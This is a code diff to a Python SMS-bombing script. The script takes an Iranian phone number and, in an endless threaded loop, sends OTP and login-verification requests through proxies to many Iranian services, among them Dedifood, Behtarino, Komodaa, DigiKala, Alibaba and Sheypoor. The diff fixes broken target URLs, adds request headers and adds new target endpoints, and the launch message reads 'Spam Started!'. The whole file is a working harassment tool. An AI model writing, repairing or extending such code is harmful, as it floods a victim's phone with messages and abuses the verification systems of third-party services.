@@ -115,8 +115,6 @@ def bama(phone):
 
 
 
-#====================# New APIs #===================#
-
 # Dedifood
 def dedifood(phone):
 
@@ -126,7 +124,7 @@ def dedifood(phone):
         "country_id": 1
         }
     try:
-        DedifoodRequest = requests.post(DedifoodURL, json=DedifoodData, proxies=proxy)
+        DedifoodRequest = requests.post(DedifoodURL ,json=DedifoodData, proxies=proxy)
         if "200" in str(DedifoodRequest):
             print(f"{green}True:  {white}Dedifood{reset}")
         else:
@@ -140,13 +138,14 @@ def dedifood(phone):
 
 # Behtarino
 def behtarino(phone):
+    global BehtarinoHeader
 
-    BehtarinoURL = "https://api.behtarino.com/api/v1/businesses/uqqnffxwen/vitrin_verification/"
+    BehtarinoURL = "https://bck.behtarino.com/api/v1/users/phone_verification/"
     BehtarinoData =  { 
         "phone": "0" + phone.split("+98")[1]
         }
     try:
-        BehtarinoRequest = requests.post(BehtarinoURL, json=BehtarinoData, proxies=proxy)
+        BehtarinoRequest = requests.post(BehtarinoURL, headers=BehtarinoHeader, json=BehtarinoData, proxies=proxy)
         if "200" in str(BehtarinoRequest):
             print(f"{green}True:  {white}Behtarino{reset}")
         else:
@@ -179,13 +178,14 @@ def delino(phone):
 
 # Zarinplus
 def zarinplus(phone):
+    global ZarinplusHeader
 
     ZarinplusURL = "https://api.zarinplus.com/user/zarinpal-login"
     ZarinplusData =  { 
         "phone_number": phone.split("+")[1]
         }
     try:
-        ZarinplusRequest = requests.post(ZarinplusURL, json=ZarinplusData, proxies=proxy)
+        ZarinplusRequest = requests.post(ZarinplusURL, headers=ZarinplusHeader, json=ZarinplusData, proxies=proxy)
         if "200" in str(ZarinplusRequest):
             print(f"{green}True:  {white}Zarinplus{reset}")
         else:
@@ -199,6 +199,7 @@ def zarinplus(phone):
 
 # Livito
 def livito(phone):
+    global LivitoHeader
 
     LivitoURL = "https://livito.tv/api/oauth/initialize"
     LivitoData =  { 
@@ -208,7 +209,7 @@ def livito(phone):
         "grant_type": "password"
         }
     try:
-        LivitoRequest = requests.post(LivitoURL, json=LivitoData, proxies=proxy)
+        LivitoRequest = requests.post(LivitoURL, headers=LivitoHeader, json=LivitoData, proxies=proxy)
         if "200" in str(LivitoRequest):
             print(f"{green}True:  {white}Livito{reset}")
         else:
@@ -222,6 +223,7 @@ def livito(phone):
 
 # Baarbaanet
 def baarbaanet(phone):
+    global BaarbaanetHeader
 
     BaarbaanetURL = "https://baarbaanet.com/Barbanet/rest/pub/user/otp/send"
     BaarbaanetData =  { 
@@ -230,7 +232,7 @@ def baarbaanet(phone):
         "viaEmail": False
         }
     try:
-        BaarbaanetRequest = requests.post(BaarbaanetURL, json=BaarbaanetData, proxies=proxy)
+        BaarbaanetRequest = requests.post(BaarbaanetURL, headers=BaarbaanetHeader, json=BaarbaanetData, proxies=proxy)
         if "200" in str(BaarbaanetRequest):
             print(f"{green}True:  {white}Baarbaanet{reset}")
         else:
@@ -244,6 +246,7 @@ def baarbaanet(phone):
 
 # Bornos
 def bornosmode(phone):
+    global BornosHeader
 
     BornosURL = "https://bornosmode.com/api/loginRegister/"
     BornosData =  { 
@@ -252,7 +255,7 @@ def bornosmode(phone):
 
         }
     try:
-        BornosRequest = requests.post(BaarbaanetURL, json=BaarbaanetData, proxies=proxy)
+        BornosRequest = requests.post(BornosURL, headers=BornosHeader, json=BornosData, proxies=proxy)
         if "200" in str(BornosRequest):
             print(f"{green}True:  {white}Bornos{reset}")
         else:
@@ -265,19 +268,88 @@ def bornosmode(phone):
 
 # Komodaa
 def komodaa(phone):
+    global KomodaHeader
 
     KomodaaURL = "https://api.komodaa.com/api/v2.6/loginRC/request"
     KomodaaData =  { 
         "phone_number": "0" + phone.split("+98")[1]
         }
     try:
-        KomodaaRequest = requests.post(BaarbaanetURL, json=BaarbaanetData, proxies=proxy)
+        KomodaaRequest = requests.post(KomodaaURL, headers=KomodaHeader, json=KomodaaData, proxies=proxy)
         if "200" in str(KomodaaRequest):
             print(f"{green}True:  {white}Komodaa{reset}")
         else:
             print(f"{red}False: {white}Komodaa{reset}")
     except:
         print(f"{yellow}Can't send request")
+
+
+
+
+
+#====================# New APIs #===================#
+
+# DigiKala
+def digikala(phone):
+    global DigiKalaHeader
+
+    DigiKalaURl = "https://api.digikala.com/v1/user/authenticate/"
+    DigiKalaData = {
+        "backUrl": "/",
+        "username": "0" + phone.split("+98")[1],
+        "otp_call": False
+    }
+    try:
+        DigiKalaRequest = requests.post(DigiKalaURl, headers=DigiKalaHeader, json=DigiKalaData, proxies=proxy)
+        if "200" in str(DigiKalaRequest):
+            print(f"{green}True:  {white}DigiKala{reset}")
+        else:
+            print(f"{red}False: {white}DigiKala{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# Alibaba
+def alibaba(phone):
+    global AlibabaHeader
+
+    AlibabaURL = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
+    AlibabaData = {
+        "phoneNumber": phone.split("+98")[1]
+    }
+    try:
+        AlibabaRequest = requests.post(AlibabaURL, headers=AlibabaHeader, json=AlibabaData, proxies=proxy)
+        if "200" in str(AlibabaRequest):
+            print(f"{green}True:  {white}Alibaba{reset}")
+        else:
+            print(f"{red}False: {white}Alibaba{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# Sheypoor
+def sheypoor(phone):
+    global SheypoorHeader
+
+    SheypoorURL = "https://www.sheypoor.com/api/v10.0.0/auth/send"
+    SheypoorData = {
+        "username": "0" + phone.split("+98")[1]
+    }
+    try:
+        SheypoorRequest = requests.post(SheypoorURL, headers=SheypoorHeader, json=SheypoorData, proxies=proxy)
+        if "200" in str(SheypoorRequest):
+            print(f"{green}True:  {white}Sheypoor{reset}")
+        else:
+            print(f"{red}False: {white}Sheypoor{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
 
 
 
@@ -297,7 +369,7 @@ def main():
     phone = input()
 
     if len(phone) == 13:    
-        print (f"{purple}Spam Started!{reset}\n")
+        print (f"{purple}Spam Started!{reset}\n{purple}Hit {white}ctrl+c{purple} or {white}ctrl+z {purple}to exit!")
 
         while True:
             Thread(target=snapp, args=[phone]).start()         # Snapp
@@ -310,9 +382,6 @@ def main():
             time.sleep(0.5)
             Thread(target=bama, args=[phone]).start()          # Bama
             time.sleep(0.5)
-
-        #=====# New APIs #=====#
-        
             Thread(target=dedifood, args=[phone]).start()      # Dedifood
             time.sleep(0.5) 
             Thread(target=behtarino, args=[phone]).start()     # Behtarino
@@ -329,6 +398,16 @@ def main():
             time.sleep(0.5)
             Thread(target=komodaa, args=[phone]).start()       # Komodaa
             time.sleep(0.5) 
+
+        #=====# New APIs #=====#
+
+            Thread(target=digikala, args=[phone]).start()    # DigiKala
+            time.sleep(0.5)
+            Thread(target=alibaba, args=[phone]).start()    # Alibaba
+            time.sleep(0.5)
+            Thread(target=sheypoor, args=[phone]).start()       # Sheypoor
+            time.sleep(0.5) 
+
 
     else:
         error = f"{white}Error: {red}Invalid number entered!"
